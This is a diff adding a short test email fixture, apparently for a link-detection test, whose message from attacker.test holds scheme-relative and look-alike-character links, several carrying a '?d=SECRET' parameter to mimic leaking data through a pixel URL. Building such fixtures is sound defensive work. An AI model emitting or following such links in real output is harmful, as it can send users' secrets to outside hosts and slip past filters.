@@ -1,0 +1,12 @@
+From: Links <links@attacker.test>
+To: Lena Hofer <lena@hofer-design.example>
+Subject: //attacker.test/pixel.png?d=SECRET
+Message-ID: <protorel-1@attacker.test>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Links without a scheme and with look-alike characters:
+x //attacker.test/?d=SECRET
+ｈｔｔｐｓ://attacker.test/fullwidth
+https‥//attacker.test/dot-leader
+Ｗｗｗ.attacker.test
